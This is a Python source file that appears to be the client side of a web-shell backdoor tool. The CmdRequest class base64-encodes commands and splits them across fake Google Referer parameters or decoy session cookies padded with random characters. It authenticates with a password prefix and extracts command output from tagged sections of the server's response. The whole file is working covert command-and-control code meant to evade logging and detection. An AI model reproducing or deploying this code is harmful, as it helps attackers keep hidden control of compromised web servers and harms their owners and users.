
import urllib2, urlparse, re, base64
from request import Request
from random import random, shuffle
from string import letters, digits
from core.pollution import pollute_with_random_str
from core.utils import randstr

default_prefixes = [ "ID", "SID", "APISID", "USRID", "SESSID", "SESS", "SSID", "USR", "PREF" ]
shuffle(default_prefixes)
			
			

class CmdRequest(Request):

	def __init__( self, url, password, proxy = None ):
		
		
		Request.__init__( self, url, proxy)
			
		self.password  = password
		self.extractor = re.compile( "<%s>(.*)</%s>" % ( self.password[2:], self.password[2:] ), re.DOTALL )
#		self.extractor_debug = re.compile( "<%sDEBUG>(.*)</%sDEBUG>" % ( self.password[2:], self.password[2:] ), re.DOTALL )
		self.parsed	   = urlparse.urlparse(self.url)
		self.data = None


		if not self.parsed.path:
			self.query = self.parsed.netloc.replace( '/', ' ' )
		else:
			self.query = ''.join( self.parsed.path.split('.')[:-1] ).replace( '/', ' ' )

	
	def setPayload( self, payload, mode):
		
		payload = base64.b64encode( payload.strip() )
		length  = len(payload)
		third	= length / 3
		thirds  = third * 2
		
		if mode == 'Referer':
			referer = "http://www.google.com/url?sa=%s&source=web&ct=7&url=%s&rct=j&q=%s&ei=%s&usg=%s&sig2=%s" % ( self.password[:2], \
	                                                                                                               urllib2.quote( self.url ), \
	                                                                                                               self.query.strip(), \
	                                                                                                              payload[:third], \
	                                                                                                               payload[third:thirds], \
	                                                                                                               payload[thirds:] )
			self['Referer']	= referer
		
		else: # mode == 'Cookie' or unset
		
			prefixes = default_prefixes[:]
			
			rand_cookie = ''
			rand_cookie += prefixes.pop() + '=' + self.password[:2] + '; '
			while len(prefixes)>3:
				if random()>0.5:
					break
				rand_cookie += prefixes.pop() + '=' + randstr(16, False, letters + digits) + '; '


			# DO NOT fuzz with %, _ (\w on regexp keep _)
			payload = pollute_with_random_str(payload, '#&*-/?@~')
		
				
			rand_cookie += prefixes.pop() + '=' + payload[:third] + '; '
			rand_cookie += prefixes.pop() + '=' + payload[third:thirds] + '; '
			rand_cookie += prefixes.pop() + '=' + payload[thirds:] 
			
			self['Cookie'] = rand_cookie
		
		
	def setPostData(self, data_dict):
		self.data = data_dict.copy()

	def execute( self , bytes = -1):
		response = self.read()
#		print self.extractor_debug.findall(response)
		data	 = self.extractor.findall(response)
		
		if len(data) < 1 or not data:
			raise NoDataException()
		else:
			return data[0].strip()
		
class NoDataException(Exception):
	pass


